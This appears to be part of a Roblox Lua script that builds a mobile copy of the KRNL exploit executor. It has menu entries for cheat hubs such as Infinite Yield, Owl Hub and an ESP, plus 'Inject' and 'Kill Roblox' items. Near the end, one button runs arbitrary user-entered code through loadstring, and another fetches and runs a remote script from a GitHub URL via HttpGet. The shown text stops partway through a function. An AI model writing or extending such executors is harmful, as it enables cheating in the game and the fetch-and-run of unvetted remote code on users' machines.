UITextSizeConstraint_27.MaxTextSize = 15

DarkDex.Name = "DarkDex"
DarkDex.Parent = HScriptsHub
DarkDex.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DarkDex.BackgroundTransparency = 1.000
DarkDex.Position = UDim2.new(0, 0, 0.385474861, 0)
DarkDex.Size = UDim2.new(1, 0, 0.128491625, 0)
DarkDex.Font = Enum.Font.SourceSans
DarkDex.Text = "              Dark Dex"
DarkDex.TextColor3 = Color3.fromRGB(255, 255, 255)
DarkDex.TextScaled = true
DarkDex.TextSize = 15.000
DarkDex.TextWrapped = true
DarkDex.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_28.Parent = DarkDex
UITextSizeConstraint_28.MaxTextSize = 15

UnamedEsp.Name = "UnamedEsp"
UnamedEsp.Parent = HScriptsHub
UnamedEsp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UnamedEsp.BackgroundTransparency = 1.000
UnamedEsp.Position = UDim2.new(0, 0, 0.513966501, 0)
UnamedEsp.Size = UDim2.new(1, 0, 0.128491625, 0)
UnamedEsp.Font = Enum.Font.SourceSans
UnamedEsp.Text = "              Unnamed ESP"
UnamedEsp.TextColor3 = Color3.fromRGB(255, 255, 255)
UnamedEsp.TextScaled = true
UnamedEsp.TextSize = 15.000
UnamedEsp.TextWrapped = true
UnamedEsp.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_29.Parent = UnamedEsp
UITextSizeConstraint_29.MaxTextSize = 15

IYFE.Name = "IYFE"
IYFE.Parent = HScriptsHub
IYFE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
IYFE.BackgroundTransparency = 1.000
IYFE.Position = UDim2.new(0, 0, 0.642458141, 0)
IYFE.Size = UDim2.new(1, 0, 0.128491625, 0)
IYFE.Font = Enum.Font.SourceSans
IYFE.Text = "              Infinite Yield"
IYFE.TextColor3 = Color3.fromRGB(255, 255, 255)
IYFE.TextScaled = true
IYFE.TextSize = 15.000
IYFE.TextWrapped = true
IYFE.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_30.Parent = IYFE
UITextSizeConstraint_30.MaxTextSize = 15

OwlHub.Name = "OwlHub"
OwlHub.Parent = HScriptsHub
OwlHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OwlHub.BackgroundTransparency = 1.000
OwlHub.Position = UDim2.new(0, 0, 0.770949781, 0)
OwlHub.Size = UDim2.new(1, 0, 0.128491625, 0)
OwlHub.Font = Enum.Font.SourceSans
OwlHub.Text = "              Owl Hub"
OwlHub.TextColor3 = Color3.fromRGB(255, 255, 255)
OwlHub.TextScaled = true
OwlHub.TextSize = 15.000
OwlHub.TextWrapped = true
OwlHub.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_31.Parent = OwlHub
UITextSizeConstraint_31.MaxTextSize = 15

HoHoHub.Name = "HoHo Hub"
HoHoHub.Parent = HScriptsHub
HoHoHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HoHoHub.BackgroundTransparency = 1.000
HoHoHub.Position = UDim2.new(0, 0, 0.899441361, 0)
HoHoHub.Size = UDim2.new(1, 0, 0.100558661, 0)
HoHoHub.Font = Enum.Font.SourceSans
HoHoHub.Text = "              Hoho Hub"
HoHoHub.TextColor3 = Color3.fromRGB(255, 255, 255)
HoHoHub.TextScaled = true
HoHoHub.TextSize = 15.000
HoHoHub.TextWrapped = true
HoHoHub.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_32.Parent = HoHoHub
UITextSizeConstraint_32.MaxTextSize = 15

BlueLight.Name = "Blue Light"
BlueLight.Parent = KrnlGUI
BlueLight.BackgroundColor3 = Color3.fromRGB(6, 139, 255)
BlueLight.BorderColor3 = Color3.fromRGB(6, 139, 255)
BlueLight.Size = UDim2.new(0.999000013, 0, 0.00300000003, 0)

CreditsW.Name = "CreditsW"
CreditsW.Parent = KrnlGUI
CreditsW.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
CreditsW.BorderColor3 = Color3.fromRGB(36, 36, 36)
CreditsW.Position = UDim2.new(1.00925303, 0, 0.0115915686, 0)
CreditsW.Size = UDim2.new(0.434822261, 0, 0.5361076, 0)
CreditsW.Visible = false

Frame_4.Parent = CreditsW
Frame_4.BackgroundColor3 = Color3.fromRGB(28, 28, 29)
Frame_4.BorderColor3 = Color3.fromRGB(28, 28, 29)
Frame_4.Size = UDim2.new(1, 0, 0.175989032, 0)

Xbutton_3.Name = "X button"
Xbutton_3.Parent = Frame_4
Xbutton_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Xbutton_3.BackgroundTransparency = 1.000
Xbutton_3.Position = UDim2.new(0.879472733, 0, 0, 0)
Xbutton_3.Size = UDim2.new(0.118848056, 0, 1, 0)
Xbutton_3.Font = Enum.Font.SourceSans
Xbutton_3.Text = "X"
Xbutton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Xbutton_3.TextScaled = true
Xbutton_3.TextSize = 30.000
Xbutton_3.TextWrapped = true

UITextSizeConstraint_33.Parent = Xbutton_3
UITextSizeConstraint_33.MaxTextSize = 30

TextLabel_4.Parent = CreditsW
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.435993314, 0, 0.174594522, 0)
TextLabel_4.Size = UDim2.new(0.535571635, 0, 0.145397589, 0)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "UI Replicated"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 17.000
TextLabel_4.TextWrapped = true
TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_34.Parent = TextLabel_4
UITextSizeConstraint_34.MaxTextSize = 17

TextLabel_5.Parent = CreditsW
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.435993314, 0, 0.315135062, 0)
TextLabel_5.Size = UDim2.new(0.535571635, 0, 0.145397589, 0)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "gearv4_#0000"
TextLabel_5.TextColor3 = Color3.fromRGB(126, 126, 126)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 15.000
TextLabel_5.TextWrapped = true
TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_35.Parent = TextLabel_5
UITextSizeConstraint_35.MaxTextSize = 15

ImageLabel_4.Parent = CreditsW
ImageLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_4.BackgroundTransparency = 1.000
ImageLabel_4.Position = UDim2.new(0.0468227416, 0, 0.225141764, 0)
ImageLabel_4.Size = UDim2.new(0.334448159, 0, 0.540540516, 0)
ImageLabel_4.Image = "rbxassetid://11671355800"

OtherTab.Name = "OtherTab"
OtherTab.Parent = KrnlGUI
OtherTab.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
OtherTab.BorderColor3 = Color3.fromRGB(43, 43, 43)
OtherTab.Position = UDim2.new(0.339520067, 0, 0.16753611, 0)
OtherTab.Size = UDim2.new(0.202141464, 0, 0.130404547, 0)
OtherTab.Visible = false

WHy.Name = "WHy"
WHy.Parent = OtherTab
WHy.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WHy.BackgroundTransparency = 1.000
WHy.Position = UDim2.new(0, 0, 0.466666698, 0)
WHy.Size = UDim2.new(1, 0, 0.513516545, 0)
WHy.Font = Enum.Font.SourceSans
WHy.Text = "              Why you here?"
WHy.TextColor3 = Color3.fromRGB(255, 255, 255)
WHy.TextScaled = true
WHy.TextSize = 15.000
WHy.TextWrapped = true
WHy.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_36.Parent = WHy
UITextSizeConstraint_36.MaxTextSize = 15

Nope.Name = "Nope"
Nope.Parent = OtherTab
Nope.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Nope.BackgroundTransparency = 1.000
Nope.Size = UDim2.new(1, 0, 0.513516545, 0)
Nope.Font = Enum.Font.SourceSans
Nope.Text = "              No Key >:)"
Nope.TextColor3 = Color3.fromRGB(255, 255, 255)
Nope.TextScaled = true
Nope.TextSize = 15.000
Nope.TextWrapped = true
Nope.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_37.Parent = Nope
UITextSizeConstraint_37.MaxTextSize = 15

FileTab.Name = "FileTab"
FileTab.Parent = KrnlGUI
FileTab.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
FileTab.BorderColor3 = Color3.fromRGB(43, 43, 43)
FileTab.Position = UDim2.new(0.00213287491, 0, 0.164638236, 0)
FileTab.Size = UDim2.new(0.202141464, 0, 0.130404547, 0)
FileTab.Visible = false

KillTask.Name = "KillTask"
KillTask.Parent = FileTab
KillTask.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
KillTask.BackgroundTransparency = 1.000
KillTask.Position = UDim2.new(0, 0, 0.51111114, 0)
KillTask.Size = UDim2.new(1, 0, 0.513516545, 0)
KillTask.Font = Enum.Font.SourceSans
KillTask.Text = "              Kill Roblox"
KillTask.TextColor3 = Color3.fromRGB(255, 255, 255)
KillTask.TextScaled = true
KillTask.TextSize = 15.000
KillTask.TextWrapped = true
KillTask.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_38.Parent = KillTask
UITextSizeConstraint_38.MaxTextSize = 15

Inject.Name = "Inject"
Inject.Parent = FileTab
Inject.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Inject.BackgroundTransparency = 1.000
Inject.Position = UDim2.new(0, 0, -0.0444444418, 0)
Inject.Size = UDim2.new(1, 0, 0.513516545, 0)
Inject.Font = Enum.Font.SourceSans
Inject.Text = "              Inject"
Inject.TextColor3 = Color3.fromRGB(255, 255, 255)
Inject.TextScaled = true
Inject.TextSize = 15.000
Inject.TextWrapped = true
Inject.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_39.Parent = Inject
UITextSizeConstraint_39.MaxTextSize = 15

GamesOpenGUI.Name = "GamesOpenGUI"
GamesOpenGUI.Parent = KrnlGUI
GamesOpenGUI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GamesOpenGUI.BorderColor3 = Color3.fromRGB(245, 245, 255)
GamesOpenGUI.Position = UDim2.new(0.309756339, 0, 0.298481524, 0)
GamesOpenGUI.Size = UDim2.new(0.347566962, 0, 0.399907291, 0)
GamesOpenGUI.Visible = false

Frame_5.Parent = GamesOpenGUI
Frame_5.BackgroundColor3 = Color3.fromRGB(245, 245, 255)
Frame_5.BorderColor3 = Color3.fromRGB(245, 245, 255)
Frame_5.Size = UDim2.new(1, 0, 0.224637687, 0)

Xbutton_4.Name = "X button"
Xbutton_4.Parent = Frame_5
Xbutton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Xbutton_4.BackgroundTransparency = 1.000
Xbutton_4.Position = UDim2.new(0.849372387, 0, 0, 0)
Xbutton_4.Size = UDim2.new(0.142259419, 0, 1, 0)
Xbutton_4.Font = Enum.Font.SourceSans
Xbutton_4.Text = "X"
Xbutton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
Xbutton_4.TextScaled = true
Xbutton_4.TextSize = 30.000
Xbutton_4.TextWrapped = true

UITextSizeConstraint_40.Parent = Xbutton_4
UITextSizeConstraint_40.MaxTextSize = 30

Frame_6.Parent = GamesOpenGUI
Frame_6.BackgroundColor3 = Color3.fromRGB(245, 245, 255)
Frame_6.BorderColor3 = Color3.fromRGB(245, 245, 255)
Frame_6.Position = UDim2.new(0, 0, 0.695652127, 0)
Frame_6.Size = UDim2.new(1, 0, 0.304347813, 0)

Okbutton_2.Name = "Ok button"
Okbutton_2.Parent = Frame_6
Okbutton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Okbutton_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
Okbutton_2.Position = UDim2.new(0.646688402, 0, 0.214285731, 0)
Okbutton_2.Size = UDim2.new(0.313807517, 0, 0.5, 0)
Okbutton_2.Font = Enum.Font.Arial
Okbutton_2.Text = "OK"
Okbutton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Okbutton_2.TextScaled = true
Okbutton_2.TextSize = 13.000
Okbutton_2.TextWrapped = true

UITextSizeConstraint_41.Parent = Okbutton_2
UITextSizeConstraint_41.MaxTextSize = 13

TextLabel_6.Parent = GamesOpenGUI
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.Position = UDim2.new(0.0379999988, 0, 0.379999995, 0)
TextLabel_6.Size = UDim2.new(0.870292902, 0, 0.231884062, 0)
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = "Disabled as the most scripts are patched."
TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.TextSize = 15.000
TextLabel_6.TextWrapped = true
TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_42.Parent = TextLabel_6
UITextSizeConstraint_42.MaxTextSize = 15

UIAspectRatioConstraint_2.Parent = KRNL
UIAspectRatioConstraint_2.AspectRatio = 1.691

FloatingGUI.Name = "FloatingGUI"
FloatingGUI.Parent = KRNL
FloatingGUI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FloatingGUI.BackgroundTransparency = 1.000
FloatingGUI.Position = UDim2.new(0, 599, 0, 62)
FloatingGUI.Size = UDim2.new(0, 39, 0, 39)
FloatingGUI.Image = "rbxassetid://11671355800"

-- Scripts:

local function JKSXXR_fake_script() -- FileButton.LocalScript 
	local script = Instance.new('LocalScript', FileButton)

	local Button = script.Parent
	local gui = script.Parent.Parent.FileTab
	
	Button.MouseButton1Up:Connect(function()
		if gui.Visible == false then
			gui.Visible = true
		else
			gui.Visible = false
		end
	end)
end
coroutine.wrap(JKSXXR_fake_script)()
local function IWZIAOM_fake_script() -- CreditsButton.LocalScript 
	local script = Instance.new('LocalScript', CreditsButton)

	local Button = script.Parent
	local gui = script.Parent.Parent.CreditsW
	
	Button.MouseButton1Up:Connect(function()
		if gui.Visible == false then
			gui.Visible = true
		else
			gui.Visible = false
		end
	end)
end
coroutine.wrap(IWZIAOM_fake_script)()
local function BDJX_fake_script() -- GamesButton.LocalScript 
	local script = Instance.new('LocalScript', GamesButton)

	local btn = script.Parent
	local Gui = script.Parent.Parent.GamesOpenGUI
	
	btn.MouseButton1Click:Connect(function()
		Gui.Visible = true
	end)
	
end
coroutine.wrap(BDJX_fake_script)()
local function BOJDWR_fake_script() -- HotScriptsButton.LocalScript 
	local script = Instance.new('LocalScript', HotScriptsButton)

	local Button = script.Parent
	local gui = script.Parent.Parent.HScriptsHub
	
	Button.MouseButton1Up:Connect(function()
		if gui.Visible == false then
			gui.Visible = true
		else
			gui.Visible = false
		end
	end)
end
coroutine.wrap(BOJDWR_fake_script)()
local function RZSXL_fake_script() -- OthersButton.LocalScript 
	local script = Instance.new('LocalScript', OthersButton)

	local Button = script.Parent
	local gui = script.Parent.Parent.OtherTab
	
	Button.MouseButton1Up:Connect(function()
		if gui.Visible == false then
			gui.Visible = true
		else
			gui.Visible = false
		end
	end)
end
coroutine.wrap(RZSXL_fake_script)()
local function OPNVFDR_fake_script() -- Xbutton.LocalScript 
	local script = Instance.new('LocalScript', Xbutton)

	local GUI = script.Parent.Parent.Parent.Parent
	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
		GUI:Destroy()
	end)
	
end
coroutine.wrap(OPNVFDR_fake_script)()
local function NETW_fake_script() -- button.LocalScript 
	local script = Instance.new('LocalScript', button)

	local btn = script.Parent
	local Gui = script.Parent.Parent.Parent
	local Krnl = script.Parent.Parent.Parent.Parent.FloatingGUI
	
	btn.MouseButton1Click:Connect(function()
		Gui.Visible = false
		Krnl.Visible = true
	end)
end
coroutine.wrap(NETW_fake_script)()
local function BWCCXZZ_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local button = script.Parent
	local SF1 = script.Parent.Parent.Parent.Parent.ScrollingFrame1
	local SF2 = script.Parent.Parent.Parent.Parent.ScrollingFrame2
	button.MouseButton1Click:Connect(function()
		if SF1.Visible == false then
			SF1.Visible = true
			SF2.Visible = false
		else
			
		end
	end)
end
coroutine.wrap(BWCCXZZ_fake_script)()
local function AFYRFVF_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	local mbutton1 = script.Parent.Parent
	local button = script.Parent
	local SF1 = script.Parent.Parent.Parent.Parent.ScrollingFrame1
	local text1 = script.Parent.Parent.Parent.Parent.ScrollingFrame1.ImageLabel.EditorFrame.Source
	local mbutton2 = script.Parent.Parent.Parent.Script2
	button.MouseButton1Click:Connect(function()
		if mbutton2.Visible == false then
			script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.KRNL:Destroy()
		end
	end)
end
coroutine.wrap(AFYRFVF_fake_script)()
local function QDTSXTQ_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	local button = script.Parent
	local SF1 = script.Parent.Parent.Parent.Parent.ScrollingFrame1
	local SF2 = script.Parent.Parent.Parent.Parent.ScrollingFrame2
	button.MouseButton1Click:Connect(function()
		if SF2.Visible == false then
			SF2.Visible = true
			SF1.Visible = false
		else
	
		end
	end)
end
coroutine.wrap(QDTSXTQ_fake_script)()
local function SUNEU_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	local mbutton = script.Parent.Parent
	local button = script.Parent
	local SF2 = script.Parent.Parent.Parent.Parent.ScrollingFrame2
	local text2 = script.Parent.Parent.Parent.Parent.ScrollingFrame2.ImageLabel.EditorFrame.Source
	local ab = script.Parent.Parent.Parent.addbutton
	button.MouseButton1Click:Connect(function() 
		if SF2.Visible == true then
			SF2.Visible = false
		else
			--Nothing here to execute
		end
		mbutton.Visible = false
		text2.Text = "--Welcome To KRNL Mobile!"
		ab.Visible = true
	end)
end
coroutine.wrap(SUNEU_fake_script)()
local function SFHZ_fake_script() -- addbutton.LocalScript 
	local script = Instance.new('LocalScript', addbutton)

	local button = script.Parent
	local SF2 = script.Parent.Parent.Parent.ScrollingFrame2
	local mbutton2 = script.Parent.Parent.Script2
	local SF1 = script.Parent.Parent.Parent.ScrollingFrame1
	button.MouseButton1Click:Connect(function()
		SF1.Visible = true
		button.Visible = false
		mbutton2.Visible = true
	end)
end
coroutine.wrap(SFHZ_fake_script)()
local function XCUKBI_fake_script() -- ImageLabel_2.LocalScript 
	local script = Instance.new('LocalScript', ImageLabel_2)

	local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
	local global_env = {"getrawmetatable", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "new", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16"}
	local Source = script.Parent.EditorFrame.Source
	local Lines = Source.Parent.Lines
	local Highlight = function(string, keywords)
		local K = {}
		local S = string
		local Token =
			{
				["="] = true,
				["."] = true,
				[","] = true,
				["("] = true,
				[")"] = true,
				["["] = true,
				["]"] = true,
				["{"] = true,
				["}"] = true,
				[":"] = true,
				["*"] = true,
				["/"] = true,
				["+"] = true,
				["-"] = true,
				["%"] = true,
				[";"] = true,
				["~"] = true
			}
		for i, v in pairs(keywords) do
			K[v] = true
		end
		S = S:gsub(".", function(c)
			if Token[c] ~= nil then
				return "\32"
			else
				return c
			end
		end)
		S = S:gsub("%S+", function(c)
			if K[c] ~= nil then
				return c
			else
				return (" "):rep(#c)
			end
		end)
		return S
	end
	local hTokens = function(string)
		local Token =
			{
				["="] = true,
				["."] = true,
				[","] = true,
				["("] = true,
				[")"] = true,
				["["] = true,
				["]"] = true,
				["{"] = true,
				["}"] = true,
				[":"] = true,
				["*"] = true,
				["/"] = true,
				["+"] = true,
				["-"] = true,
				["%"] = true,
				[";"] = true,
				["~"] = true
			}
		local A = ""
		string:gsub(".", function(c)
			if Token[c] ~= nil then
				A = A .. c
			elseif c == "\n" then
				A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
			else
				A = A .. "\32"
			end
		end)
		return A
	end
	
	local strings = function(string)
		local highlight = ""
		local quote = false
		string:gsub(".", function(c)
			if quote == false and c == "\"" then
				quote = true
			elseif quote == true and c == "\"" then
				quote = false
			end
			if quote == false and c == "\"" then
				highlight = highlight .. "\""
			elseif c == "\n" then
				highlight = highlight .. "\n"
			elseif c == "\t" then
				highlight = highlight .. "\t"
			elseif quote == true then
				highlight = highlight .. c
			elseif quote == false then
				highlight = highlight .. "\32"
			end
		end)
		return highlight
	end
	local comments = function(string)
		local ret = ""
		string:gsub("[^\r\n]+", function(c)
			local comm = false
			local i = 0
			c:gsub(".", function(n)
				i = i + 1
				if c:sub(i, i + 1) == "--" then
					comm = true
				end
				if comm == true then
					ret = ret .. n
				else
					ret = ret .. "\32"
				end
			end)
			ret = ret
		end)
		return ret
	end
	local numbers = function(string)
		local A = ""
		string:gsub(".", function(c)
			if tonumber(c) ~= nil then
				A = A .. c
			elseif c == "\n" then
				A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
			else
				A = A .. "\32"
			end
		end)
		return A
	end
	local highlight_source = function(type)
		if type == "Text" then
			Source.Text = Source.Text:gsub("\13", "")
			Source.Text = Source.Text:gsub("\t", "      ")
			local s = Source.Text
			Source.Keywords_.Text = Highlight(s, lua_keywords)
			Source.Globals_.Text = Highlight(s, global_env)
			Source.RemoteHighlight_.Text = Highlight(s, {"FireServer", "fireServer", "InvokeServer", "invokeServer"})
			Source.Tokens_.Text = hTokens(s)
			Source.Numbers_.Text = numbers(s)
			Source.Strings_.Text = strings(s)
			local lin = 1
			s:gsub("\n", function()
				lin = lin + 1
			end)
			Lines.Text = ""
			for i = 1, lin do
				Lines.Text = Lines.Text .. i .. "\n"
			end
		end
	end
	highlight_source("Text")
	Source.Changed:Connect(highlight_source)
end
coroutine.wrap(XCUKBI_fake_script)()
local function VVLPP_fake_script() -- ImageLabel_3.LocalScript 
	local script = Instance.new('LocalScript', ImageLabel_3)

	local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
	local global_env = {"getrawmetatable", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "new", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16"}
	local Source = script.Parent.EditorFrame.Source
	local Lines = Source.Parent.Lines
	local Highlight = function(string, keywords)
		local K = {}
		local S = string
		local Token =
			{
				["="] = true,
				["."] = true,
				[","] = true,
				["("] = true,
				[")"] = true,
				["["] = true,
				["]"] = true,
				["{"] = true,
				["}"] = true,
				[":"] = true,
				["*"] = true,
				["/"] = true,
				["+"] = true,
				["-"] = true,
				["%"] = true,
				[";"] = true,
				["~"] = true
			}
		for i, v in pairs(keywords) do
			K[v] = true
		end
		S = S:gsub(".", function(c)
			if Token[c] ~= nil then
				return "\32"
			else
				return c
			end
		end)
		S = S:gsub("%S+", function(c)
			if K[c] ~= nil then
				return c
			else
				return (" "):rep(#c)
			end
		end)
		return S
	end
	local hTokens = function(string)
		local Token =
			{
				["="] = true,
				["."] = true,
				[","] = true,
				["("] = true,
				[")"] = true,
				["["] = true,
				["]"] = true,
				["{"] = true,
				["}"] = true,
				[":"] = true,
				["*"] = true,
				["/"] = true,
				["+"] = true,
				["-"] = true,
				["%"] = true,
				[";"] = true,
				["~"] = true
			}
		local A = ""
		string:gsub(".", function(c)
			if Token[c] ~= nil then
				A = A .. c
			elseif c == "\n" then
				A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
			else
				A = A .. "\32"
			end
		end)
		return A
	end
	
	local strings = function(string)
		local highlight = ""
		local quote = false
		string:gsub(".", function(c)
			if quote == false and c == "\"" then
				quote = true
			elseif quote == true and c == "\"" then
				quote = false
			end
			if quote == false and c == "\"" then
				highlight = highlight .. "\""
			elseif c == "\n" then
				highlight = highlight .. "\n"
			elseif c == "\t" then
				highlight = highlight .. "\t"
			elseif quote == true then
				highlight = highlight .. c
			elseif quote == false then
				highlight = highlight .. "\32"
			end
		end)
		return highlight
	end
	local comments = function(string)
		local ret = ""
		string:gsub("[^\r\n]+", function(c)
			local comm = false
			local i = 0
			c:gsub(".", function(n)
				i = i + 1
				if c:sub(i, i + 1) == "--" then
					comm = true
				end
				if comm == true then
					ret = ret .. n
				else
					ret = ret .. "\32"
				end
			end)
			ret = ret
		end)
		return ret
	end
	local numbers = function(string)
		local A = ""
		string:gsub(".", function(c)
			if tonumber(c) ~= nil then
				A = A .. c
			elseif c == "\n" then
				A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
			else
				A = A .. "\32"
			end
		end)
		return A
	end
	local highlight_source = function(type)
		if type == "Text" then
			Source.Text = Source.Text:gsub("\13", "")
			Source.Text = Source.Text:gsub("\t", "      ")
			local s = Source.Text
			Source.Keywords_.Text = Highlight(s, lua_keywords)
			Source.Globals_.Text = Highlight(s, global_env)
			Source.RemoteHighlight_.Text = Highlight(s, {"FireServer", "fireServer", "InvokeServer", "invokeServer"})
			Source.Tokens_.Text = hTokens(s)
			Source.Numbers_.Text = numbers(s)
			Source.Strings_.Text = strings(s)
			local lin = 1
			s:gsub("\n", function()
				lin = lin + 1
			end)
			Lines.Text = ""
			for i = 1, lin do
				Lines.Text = Lines.Text .. i .. "\n"
			end
		end
	end
	highlight_source("Text")
	Source.Changed:Connect(highlight_source)
end
coroutine.wrap(VVLPP_fake_script)()
local function WMPZGUU_fake_script() -- Execute.LocalScript 
	local script = Instance.new('LocalScript', Execute)

	script.Parent.MouseButton1Down:Connect(function()
        loadstring(script.Parent.Parent.Parent.MainGUI.ExecuteBar.ScrollingFrame1.ImageLabel.EditorFrame.Source.Text)()
	end)
end
coroutine.wrap(WMPZGUU_fake_script)()
local function UDBRM_fake_script() -- Clear.LocalScript 
	local script = Instance.new('LocalScript', Clear)

	local button = script.Parent
	local text1 = script.Parent.Parent.Parent.MainGUI.ExecuteBar.ScrollingFrame1.ImageLabel.EditorFrame.Source
	button.MouseButton1Click:Connect(function()
        text1.Text = ""
	end)
end
coroutine.wrap(UDBRM_fake_script)()
local function BFFHFLM_fake_script() -- InjectButton.LocalScript 
	local script = Instance.new('LocalScript', InjectButton)

	local btn = script.Parent
	local Gui = script.Parent.Parent.Parent.InjectedMessgae
	
	btn.MouseButton1Click:Connect(function()
		Gui.Visible = true
	end)
	
end
coroutine.wrap(BFFHFLM_fake_script)()
local function MRVGBRW_fake_script() -- KrnlGUI.Drag 
	local script = Instance.new('LocalScript', KrnlGUI)

	local frame = script.Parent
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(MRVGBRW_fake_script)()
local function QVFBOG_fake_script() -- Xbutton_2.LocalScript 
	local script = Instance.new('LocalScript', Xbutton_2)

	local btn = script.Parent
	local Gui = script.Parent.Parent.Parent
	
	btn.MouseButton1Click:Connect(function()
		Gui.Visible = false
	end)
end
coroutine.wrap(QVFBOG_fake_script)()
local function VEDCZN_fake_script() -- Okbutton.LocalScript 
	local script = Instance.new('LocalScript', Okbutton)

	local btn = script.Parent
	local Gui = script.Parent.Parent.Parent
	
	btn.MouseButton1Click:Connect(function()
		Gui.Visible = false
	end)
end
coroutine.wrap(VEDCZN_fake_script)()
local function IHNUMQ_fake_script() -- InjectedMessgae.Drag 
	local script = Instance.new('LocalScript', InjectedMessgae)

	local frame = script.Parent
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(IHNUMQ_fake_script)()
local function FJVQORH_fake_script() -- DexExplorer.LocalScript 
	local script = Instance.new('LocalScript', DexExplorer)

	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/peyton2465/Dex/master/out.lua"))()
	end)
end
coroutine.wrap(FJVQORH_fake_script)()
local function WHQB_fake_script() -- OpenGui.LocalScript 
	local script = Instance.new('LocalScript', OpenGui)

	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
